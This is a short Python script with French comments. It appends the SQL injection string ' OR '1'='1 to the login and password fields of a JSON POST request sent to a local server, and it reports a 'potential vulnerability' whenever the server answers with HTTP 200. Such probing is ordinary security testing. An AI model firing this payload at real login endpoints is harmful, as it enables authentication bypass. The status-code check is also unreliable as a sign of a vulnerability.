import requests
import json

def test_json_injection(url, param_dict):
    # Payload d'injection JSON
    payload = "' OR '1'='1"

    for param in param_dict:
        # Copier les paramètres originaux
        injected_param = param_dict.copy()
        # Injecter la charge utile
        injected_param[param] += payload
        try:
            # Envoyer une requête POST avec les données JSON
            response = requests.post(url, json=injected_param)
            if response.status_code == 200:
                print(f"Potential JSON Injection vulnerability detected in parameter: {param}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

# Remplacez 'http://yourserver.com/api' par l'URL de votre serveur
# Remplacez 'field1' et 'field2' par les noms de vos paramètres
test_json_injection('http://127.0.0.1:3000', {'login_field': '', 'password_field': ''})